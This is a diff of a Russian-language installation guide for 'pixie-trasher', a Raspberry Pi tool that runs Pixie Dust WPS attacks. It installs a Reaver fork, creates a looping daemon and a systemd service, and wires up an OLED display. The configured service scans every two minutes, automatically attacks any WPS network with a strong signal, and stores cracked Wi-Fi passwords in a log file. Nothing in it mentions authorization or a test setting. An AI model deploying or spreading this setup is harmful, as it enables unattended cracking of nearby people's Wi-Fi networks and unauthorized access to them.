@@ -1,38 +1,43 @@
-# 📖 ПИКСИ-ДАСТ АТАКЕР - ПОЛНАЯ ИНСТРУКЦИЯ ПО УСТАНОВКЕ
+
+# 📖 ПОЛНАЯ ИНСТРУКЦИЯ ПО УСТАНОВКЕ pixie-trasher
 
 ---
 
 ## 📋 СОДЕРЖАНИЕ
 
-1. Требования
+1. Требования к системе
 2. Установка зависимостей
 3. Установка модифицированного Reaver
-4. Создание файлов
-5. Запуск и проверка
-6. Управление службой
-7. Настройка интервала
-8. Устранение неполадок
+4. Создание файлов скрипта
+5. Настройка OLED дисплея (опционально)
+6. Запуск и проверка
+7. Настройка автозапуска (systemd)
+8. Управление службой
+9. Устранение неполадок
 
 ---
 
-## 1️⃣ ТРЕБОВАНИЯ
+## 1️⃣ ТРЕБОВАНИЯ К СИСТЕМЕ
 
 | Компонент | Требование |
 |-----------|------------|
-| **ОС** | Debian/Ubuntu/Raspberry Pi OS/Kali Linux |
+| **Операционная система** | Debian / Ubuntu / Raspberry Pi OS / Kali Linux |
 | **Wi-Fi адаптер** | С поддержкой режима монитора (Atheros, Ralink, Realtek) |
-| **Права** | root (sudo) |
+| **Права доступа** | root (sudo) |
 | **Интернет** | Для установки пакетов |
+| **OLED дисплей** | SSD1306 или SH1106 (опционально) |
 
 ---
 
 ## 2️⃣ УСТАНОВКА ЗАВИСИМОСТЕЙ
 
+Откройте терминал и выполните команды:
+
 ```bash
-# Обновляем список пакетов
+# Обновление списка пакетов
 sudo apt update
 
-# Устанавливаем основные пакеты
+# Установка основных пакетов
 sudo apt install -y \
     aircrack-ng \
     wireless-tools \
@@ -40,9 +45,10 @@ sudo apt install -y \
     build-essential \
     libpcap-dev \
     libsqlite3-dev \
-    git
+    git \
+    screen
 
-# Устанавливаем Python библиотеку для OLED (опционально)
+# Установка Python библиотеки для OLED (опционально)
 pip3 install luma.oled
 ```
 
@@ -50,15 +56,19 @@ pip3 install luma.oled
 
 ## 3️⃣ УСТАНОВКА МОДИФИЦИРОВАННОГО REAVER
 
-Стандартный Reaver **не поддерживает** Pixie Dust. Нужна специальная версия:
+Стандартный Reaver **НЕ ПОДДЕРЖИВАЕТ** Pixie Dust. Нужна специальная версия:
 
 ```bash
-# Удаляем старую версию
+# Удаляем старую версию (если установлена)
 sudo apt remove reaver -y
 
-# Клонируем форк с поддержкой Pixie Dust
+# Переходим во временную папку
 cd /tmp
+
+# Клонируем форк с поддержкой Pixie Dust
 git clone https://github.com/t6x/reaver-wps-fork-t6x
+
+# Переходим в папку с исходниками
 cd reaver-wps-fork-t6x/src
 
 # Компилируем
@@ -68,7 +78,10 @@ make
 # Устанавливаем
 sudo make install
 
-# Проверяем (должна быть опция -K)
+# Возвращаемся в домашнюю папку
+cd ~
+
+# Проверяем установку (должна быть опция -K)
 reaver -h 2>&1 | grep -i pixie
 ```
 
@@ -79,15 +92,16 @@ reaver -h 2>&1 | grep -i pixie
 
 ---
 
-## 4️⃣ СОЗДАНИЕ ФАЙЛОВ
+## 4️⃣ СОЗДАНИЕ ФАЙЛОВ СКРИПТА
 
 ### 4.1 Основной скрипт атаки
 
 ```bash
+# Создаём файл
 sudo nano /root/pixie_attacker.sh
 ```
 
-**Скопируйте содержимое** (файл будет предоставлен отдельно) и сохраните (Ctrl+X, Y, Enter).
+**Скопируйте содержимое скрипта** (см. файл `pixie_attacker.sh` выше) и сохраните (Ctrl+X, Y, Enter).
 
 ```bash
 # Делаем исполняемым
@@ -97,10 +111,11 @@ sudo chmod +x /root/pixie_attacker.sh
 ### 4.2 Скрипт для OLED (опционально)
 
 ```bash
+# Создаём файл
 sudo nano /root/oled_display.py
 ```
 
-**Скопируйте содержимое** (файл будет предоставлен отдельно) и сохраните.
+**Скопируйте содержимое скрипта** (см. файл `oled_display.py` выше) и сохраните.
 
 ```bash
 # Делаем исполняемым
@@ -110,6 +125,7 @@ sudo chmod +x /root/oled_display.py
 ### 4.3 Демон для циклического запуска
 
 ```bash
+# Создаём файл демона
 sudo nano /usr/local/bin/pixie-attacker-daemon.sh
 ```
 
@@ -118,12 +134,7 @@ sudo nano /usr/local/bin/pixie-attacker-daemon.sh
 ```bash
 #!/bin/bash
 
-# ============================================
-# ДЕМОН ДЛЯ PIXIE DUST ATTACKER
-# Запускает атаку в цикле
-# ============================================
-
-INTERVAL=600  # 10 минут между циклами
+INTERVAL=120  # 2 минуты между циклами
 LOG_FILE="/var/log/pixie-attacker.log"
 
 log() {
@@ -135,10 +146,9 @@ log "=== Pixie-Dust Attacker Daemon Started ==="
 while true; do
     log "--- Starting new attack cycle ---"
     
-    # Запускаем основной скрипт в неинтерактивном режиме
     /root/pixie_attacker.sh -t 30 -o /var/log/pixie_results < /dev/null
     
-    local exit_code=$?
+    exit_code=$?
     log "Attack cycle finished with exit code: $exit_code"
     
     log "Waiting ${INTERVAL} seconds before next cycle..."
@@ -151,9 +161,87 @@ done
 sudo chmod +x /usr/local/bin/pixie-attacker-daemon.sh
 ```
 
-### 4.4 Служба systemd
+### 4.4 Создание директорий
 
 ```bash
+# Директория для результатов
+sudo mkdir -p /var/log/pixie_results
+```
+
+---
+
+## 5️⃣ НАСТРОЙКА OLED ДИСПЛЕЯ (опционально)
+
+### 5.1 Подключение к Raspberry Pi
+
+| Pin на OLED | Pin на Raspberry Pi |
+|-------------|---------------------|
+| VCC | Pin 1 (3.3V) |
+| GND | Pin 6 (GND) |
+| SDA | Pin 3 (GPIO2) |
+| SCL | Pin 5 (GPIO3) |
+
+### 5.2 Включение I2C на Raspberry Pi
+
+```bash
+# Запускаем конфигуратор
+sudo raspi-config
+
+# Выбираем:
+# 3 Interface Options → I5 I2C → Yes
+
+# Перезагружаемся
+sudo reboot
+```
+
+### 5.3 Проверка подключения
+
+```bash
+# После перезагрузки проверяем
+sudo i2cdetect -y 0
+```
+
+**Ожидаемый вывод (адрес 0x3C):**
+```
+     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f
+00:                         -- -- -- -- -- -- -- -- 
+30: -- -- -- -- -- -- -- -- -- -- -- -- 3c -- -- --
+```
+
+---
+
+## 6️⃣ ЗАПУСК И ПРОВЕРКА
+
+### 6.1 Ручной запуск (интерактивный)
+
+```bash
+sudo /root/pixie_attacker.sh
+```
+
+### 6.2 Ручной запуск (неинтерактивный)
+
+```bash
+sudo /root/pixie_attacker.sh -t 30 -o /var/log/pixie_results < /dev/null
+```
+
+### 6.3 Проверка результатов
+
+```bash
+# Просмотр найденных паролей
+cat /var/log/pixie_results/cracked_passwords.txt
+
+# Просмотр лога
+cat /var/log/pixie-attacker.log
+```
+
+---
+
+## 7️⃣ НАСТРОЙКА АВТОЗАПУСКА (systemd)
+
+### 7.1 Создание службы
+
+```bash
+# Создаём файл службы
 sudo nano /etc/systemd/system/pixie-attacker.service
 ```
 
@@ -163,7 +251,6 @@ sudo nano /etc/systemd/system/pixie-attacker.service
 [Unit]
 Description=Pixie-Dust WPS Attacker Service
 After=network.target multi-user.target
-Wants=network.target
 
 [Service]
 Type=simple
@@ -174,28 +261,12 @@ Restart=always
 RestartSec=10
 StandardOutput=journal
 StandardError=journal
-TimeoutStartSec=0
-TimeoutStopSec=30
 
 [Install]
 WantedBy=multi-user.target
 ```
 
-### 4.5 Создание директорий
-
-```bash
-# Директория для результатов атак
-sudo mkdir -p /var/log/pixie_results
-
-# Директория для логов
-sudo mkdir -p /var/log
-```
-
----
-
-## 5️⃣ ЗАПУСК И ПРОВЕРКА
-
-### 5.1 Запуск службы
+### 7.2 Запуск службы
 
 ```bash
 # Перезагружаем конфигурацию systemd
@@ -206,45 +277,14 @@ sudo systemctl enable pixie-attacker
 
 # Запускаем службу сейчас
 sudo systemctl start pixie-attacker
-```
 
-### 5.2 Проверка статуса
-
-```bash
-# Статус службы
+# Проверяем статус
 sudo systemctl status pixie-attacker
-```
-
-**Ожидаемый вывод (активная служба):**
-```
-● pixie-attacker.service - Pixie-Dust WPS Attacker Service
-     Loaded: loaded (/etc/systemd/system/pixie-attacker.service; enabled)
-     Active: active (running) since ...
-```
-
-### 5.3 Просмотр логов
-
-```bash
-# Последние логи
-sudo journalctl -u pixie-attacker -n 30
-
-# Следить за логами в реальном времени
-sudo journalctl -u pixie-attacker -f
-```
-
-### 5.4 Проверка результатов
-
-```bash
-# Посмотреть найденные пароли
-cat /var/log/pixie_results/cracked_passwords.txt
-
-# Посмотреть лог демона
-cat /var/log/pixie-attacker.log
 ```
 
 ---
 
-## 6️⃣ УПРАВЛЕНИЕ СЛУЖБОЙ
+## 8️⃣ УПРАВЛЕНИЕ СЛУЖБОЙ
 
 | Команда | Действие |
 |---------|----------|
@@ -254,43 +294,39 @@ cat /var/log/pixie-attacker.log
 | `sudo systemctl status pixie-attacker` | Показать статус |
 | `sudo systemctl enable pixie-attacker` | Автозапуск при загрузке |
 | `sudo systemctl disable pixie-attacker` | Отключить автозапуск |
-| `sudo journalctl -u pixie-attacker -f` | Следить за логами |
-| `sudo journalctl -u pixie-attacker -n 50` | Последние 50 строк логов |
 
----
-
-## 7️⃣ НАСТРОЙКА ИНТЕРВАЛА
-
-Измените интервал между циклами атаки в файле демона:
+### Просмотр логов
 
 ```bash
+# Логи службы в реальном времени
+sudo journalctl -u pixie-attacker -f
+
+# Последние 50 строк логов
+sudo journalctl -u pixie-attacker -n 50
+
+# Логи за последний час
+sudo journalctl -u pixie-attacker --since "1 hour ago"
+```
+
+### Изменение интервала атак
+
+```bash
+# Редактируем файл демона
 sudo nano /usr/local/bin/pixie-attacker-daemon.sh
-```
 
-Найдите строку:
-```bash
-INTERVAL=600  # 10 минут между циклами
-```
+# Изменяем INTERVAL (в секундах):
+# INTERVAL=120  (2 минуты)
+# INTERVAL=300  (5 минут)
+# INTERVAL=600  (10 минут)
+# INTERVAL=3600 (1 час)
 
-**Варианты настройки:**
-
-| Значение | Интервал |
-|----------|----------|
-| `INTERVAL=300` | 5 минут |
-| `INTERVAL=600` | 10 минут |
-| `INTERVAL=1800` | 30 минут |
-| `INTERVAL=3600` | 1 час |
-| `INTERVAL=7200` | 2 часа |
-| `INTERVAL=21600` | 6 часов |
-
-После изменения перезапустите службу:
-```bash
+# Перезапускаем службу
 sudo systemctl restart pixie-attacker
 ```
 
 ---
 
-## 8️⃣ УСТРАНЕНИЕ НЕПОЛАДОК
+## 9️⃣ УСТРАНЕНИЕ НЕПОЛАДОК
 
 ### ❌ Ошибка: `reaver: command not found`
 
@@ -307,23 +343,23 @@ sudo apt install reaver -y
 ### ❌ Ошибка: `status=203/EXEC`
 
 ```bash
-# Проверьте, что файл существует
+# Проверьте существование файла
 ls -la /usr/local/bin/pixie-attacker-daemon.sh
 
 # Проверьте права
 sudo chmod +x /usr/local/bin/pixie-attacker-daemon.sh
 
-# Проверьте формат (должен быть LF, не CRLF)
+# Проверьте формат (должен быть LF)
 file /usr/local/bin/pixie-attacker-daemon.sh
 ```
 
 ### ❌ Ошибка: `No wireless interfaces found`
 
 ```bash
-# Проверьте, что Wi-Fi адаптер виден
+# Проверьте видимость Wi-Fi адаптера
 iwconfig
 
-# Убедитесь, что адаптер поддерживает режим монитора
+# Проверьте режим монитора
 sudo airmon-ng start wlan0
 ```
 
@@ -337,52 +373,39 @@ sudo journalctl -u pixie-attacker -n 50 --no-pager
 sudo systemd-analyze verify /etc/systemd/system/pixie-attacker.service
 ```
 
-### ❌ Атака не работает (Pixie Dust)
-
-- Некоторые роутеры **не уязвимы** к Pixie Dust
-- Проверьте сигнал (должен быть не слабее -65)
-- Убедитесь, что WPS включен и не заблокирован (Locked=No)
-
----
-
-## 9️⃣ ДОПОЛНИТЕЛЬНЫЕ КОМАНДЫ
-
-### Ручной запуск (интерактивный)
+### ❌ Ошибка I2C при использовании OLED
 
 ```bash
-sudo /root/pixie_attacker.sh
-```
+# Проверьте подключение
+sudo i2cdetect -y 0
 
-### Ручной запуск (неинтерактивный, как из службы)
-
-```bash
-sudo /root/pixie_attacker.sh -t 30 -o /var/log/pixie_results < /dev/null
-```
-
-### Просмотр всех найденных паролей
-
-```bash
-cat /var/log/pixie_results/cracked_passwords.txt
-```
-
-### Очистка результатов
-
-```bash
-sudo rm -rf /var/log/pixie_results/*
-```
-
-### Полная остановка и удаление службы
-
-```bash
-sudo systemctl stop pixie-attacker
-sudo systemctl disable pixie-attacker
-sudo rm /etc/systemd/system/pixie-attacker.service
-sudo systemctl daemon-reload
+# Проверьте порт в скрипте (I2C_PORT = 0 или 1)
 ```
 
 ---
 
-## 🔟 БЫСТРАЯ УСТАНОВКА (ВСЕ КОМАНДЫ ОДНИМ БЛОКОМ)
+## 📁 СТРУКТУРА ФАЙЛОВ ПОСЛЕ УСТАНОВКИ
+
+```
+/root/
+├── pixie_attacker.sh              # Основной скрипт
+└── oled_display.py                # OLED поддержка (опционально)
+
+/usr/local/bin/
+└── pixie-attacker-daemon.sh       # Демон
+
+/etc/systemd/system/
+└── pixie-attacker.service         # systemd служба
+
+/var/log/
+├── pixie_results/                 # Результаты атак
+│   └── cracked_passwords.txt      # Найденные пароли
+└── pixie-attacker.log             # Лог демона
+```
+
+---
+
+## 🚀 БЫСТРАЯ УСТАНОВКА (ВСЕ КОМАНДЫ ОДНИМ БЛОКОМ)
 
 ```bash
 # 1. Зависимости
@@ -401,62 +424,35 @@ cd ~
 # 3. Директории
 sudo mkdir -p /var/log/pixie_results
 
-# 4. Запуск службы
+# 4. Создание скриптов (СКОПИРУЙТЕ СОДЕРЖИМОЕ ОТДЕЛЬНО!)
+# sudo nano /root/pixie_attacker.sh
+# sudo nano /root/oled_display.py
+# sudo nano /usr/local/bin/pixie-attacker-daemon.sh
+# sudo nano /etc/systemd/system/pixie-attacker.service
+
+# 5. Права
+sudo chmod +x /root/pixie_attacker.sh
+sudo chmod +x /root/oled_display.py
+sudo chmod +x /usr/local/bin/pixie-attacker-daemon.sh
+
+# 6. Запуск службы
 sudo systemctl daemon-reload
 sudo systemctl enable pixie-attacker
 sudo systemctl start pixie-attacker
 
-# 5. Проверка
+# 7. Проверка
 sudo systemctl status pixie-attacker
-sudo journalctl -u pixie-attacker -n 20
+sudo journalctl -u pixie-attacker -f
 ```
 
 ---
 
-## 📱 ЧТО ПОКАЗЫВАЕТ OLED (если подключен)
+## ✅ ПОСЛЕ УСТАНОВКИ
 
-| Статус | Экран |
-|--------|-------|
-| Сканирование | `Scanning WPS...` |
-| Найдено сетей | `Found: 5 nets` |
-| Атака | `[2/5] Cracking...` + название сети |
-| Успех | `CRACKED!` + `PIN: 12345670` + `PASS: MySecret` |
-| Не уязвим | `FAILED` + `Not vulnerable` |
-| Уже взломана | `SKIPPED` + `Already cracked` |
-| Завершение | `COMPLETE!` + `Cracked: 3/5` |
+Служба будет автоматически:
+1. Запускаться при загрузке системы
+2. Сканировать WPS сети каждые 2 минуты
+3. Атаковать сети с хорошим сигналом
+4. Сохранять найденные пароли в `/var/log/pixie_results/cracked_passwords.txt`
 
 ---
-
-## ⚠️ ВАЖНЫЕ ЗАМЕЧАНИЯ
-
-1. **Wi-Fi адаптер** должен быть всегда подключен
-2. **Скрипт работает в неинтерактивном режиме** — автоматически атакует сети с хорошим сигналом
-3. **Пароли сохраняются** в `/var/log/pixie_results/cracked_passwords.txt`
-4. **При повторном запуске** уже взломанные сети пропускаются
-5. **Для работы Pixie Dust** нужен уязвимый роутер (не все роутеры подвержены)
-
----
-
-## 📁 СТРУКТУРА ФАЙЛОВ ПОСЛЕ УСТАНОВКИ
-
-```
-/root/
-├── pixie_attacker.sh          # Основной скрипт
-└── oled_display.py            # OLED поддержка (опционально)
-
-/usr/local/bin/
-└── pixie-attacker-daemon.sh   # Демон
-
-/etc/systemd/system/
-└── pixie-attacker.service     # systemd служба
-
-/var/log/
-├── pixie_results/             # Результаты атак
-│   ├── cracked_passwords.txt  # Все пароли
-│   └── *.txt                  # Детали по сетям
-└── pixie-attacker.log         # Лог демона
-```
-
----
-
-**Установка завершена! Служба автоматически запустится при загрузке системы.** 🔥
